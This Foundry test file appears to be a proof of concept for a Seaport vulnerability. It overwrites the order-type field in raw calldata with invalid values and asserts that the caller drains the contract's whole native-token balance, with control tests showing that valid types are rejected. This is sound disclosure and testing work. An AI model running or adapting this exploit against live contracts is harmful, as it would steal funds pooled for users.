// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import { Test } from "forge-std/Test.sol";
import { ConsiderationInterface } from "seaport-types/src/interfaces/ConsiderationInterface.sol";
import { ItemType, OrderType } from "seaport-types/src/lib/ConsiderationEnums.sol";
import {
    AdvancedOrder,
    ConsiderationItem,
    CriteriaResolver,
    OfferItem,
    OrderParameters
} from "seaport-types/src/lib/ConsiderationStructs.sol";

contract InvalidOrderTypeNativeOfferPoC is Test {
    address internal constant SEAPORT =
        0x0000000000000068F116a894984e2DB1123eB395;

    receive() external payable {}

    function _canonicalCallData(uint256 nativeOfferAmount)
        internal
        view
        returns (bytes memory callData)
    {
        OfferItem[] memory offer = new OfferItem[](1);
        offer[0] = OfferItem({
            itemType: ItemType.NATIVE,
            token: address(0),
            identifierOrCriteria: 0,
            startAmount: nativeOfferAmount,
            endAmount: nativeOfferAmount
        });

        ConsiderationItem[] memory consideration = new ConsiderationItem[](0);
        OrderParameters memory parameters = OrderParameters({
            offerer: address(this),
            zone: address(0),
            offer: offer,
            consideration: consideration,
            orderType: OrderType.FULL_OPEN,
            startTime: block.timestamp - 1,
            endTime: block.timestamp + 1 days,
            zoneHash: bytes32(0),
            salt: 0x515151,
            conduitKey: bytes32(0),
            totalOriginalConsiderationItems: 0
        });

        AdvancedOrder memory advancedOrder = AdvancedOrder({
            parameters: parameters,
            numerator: 1,
            denominator: 1,
            signature: "",
            extraData: ""
        });

        callData = abi.encodeCall(
            ConsiderationInterface.fulfillAdvancedOrder,
            (
                advancedOrder,
                new CriteriaResolver[](0),
                bytes32(0),
                address(this)
            )
        );
    }

    function _callWithRawOrderType(uint256 rawOrderType, uint256 amount)
        internal
        returns (bool success, bytes memory returnData)
    {
        bytes memory callData = _canonicalCallData(amount);

        // ABI layout:
        // 0x04              top-level tuple head
        // 0x04 + 0x80       AdvancedOrder
        // + 0xa0            OrderParameters
        // + 0x80            orderType
        // Therefore the orderType word begins 0x1a4 bytes into calldata.
        assembly {
            mstore(add(callData, 0x1c4), rawOrderType)
        }

        uint256 observed;
        assembly {
            observed := mload(add(callData, 0x1c4))
        }
        assertEq(observed, rawOrderType, "raw order type mutation failed");

        (success, returnData) = SEAPORT.call(callData);
    }

    function testRawTypeFiveCanSpendAndRefundEntireSeaportBalance() public {
        uint256 seededBalance = 7 ether;
        vm.deal(SEAPORT, seededBalance);

        uint256 attackerBefore = address(this).balance;
        (bool success, bytes memory returnData) = _callWithRawOrderType(5, 1);

        if (!success) {
            assembly {
                revert(add(returnData, 0x20), mload(returnData))
            }
        }

        assertEq(abi.decode(returnData, (bool)), true);
        assertEq(SEAPORT.balance, 0, "Seaport retained native balance");
        assertEq(
            address(this).balance,
            attackerBefore + seededBalance,
            "caller did not receive the complete pooled balance"
        );

        emit log_named_uint("raw_order_type", 5);
        emit log_named_uint("seeded_seaport_balance", seededBalance);
        emit log_named_uint("attacker_delta", address(this).balance - attackerBefore);
        emit log_named_uint("seaport_balance_after", SEAPORT.balance);
    }

    function testRawTypesSixAndMaxAlsoBypassNativeOfferRestriction() public {
        uint256[2] memory rawTypes = [uint256(6), type(uint256).max];

        for (uint256 i; i < rawTypes.length; ++i) {
            vm.deal(SEAPORT, 3 ether);
            uint256 attackerBefore = address(this).balance;
            (bool success, bytes memory returnData) =
                _callWithRawOrderType(rawTypes[i], 1);

            if (!success) {
                assembly {
                    revert(add(returnData, 0x20), mload(returnData))
                }
            }

            assertEq(SEAPORT.balance, 0);
            assertEq(address(this).balance - attackerBefore, 3 ether);
            emit log_named_uint("accepted_raw_order_type", rawTypes[i]);
        }
    }

    function testCanonicalFullOpenNativeOfferIsRejected() public {
        vm.deal(SEAPORT, 1 ether);
        (bool success,) = _callWithRawOrderType(0, 1);
        assertFalse(success, "canonical non-contract native offer unexpectedly accepted");
        assertEq(SEAPORT.balance, 1 ether, "failed call changed protocol balance");
    }

    function testContractTypeControlDoesNotTreatEOAStyleOrderAsSignedOrder() public {
        vm.deal(SEAPORT, 1 ether);
        (bool success,) = _callWithRawOrderType(4, 1);
        assertFalse(success, "contract-order control unexpectedly succeeded");
        assertEq(SEAPORT.balance, 1 ether, "failed control changed protocol balance");
    }
}
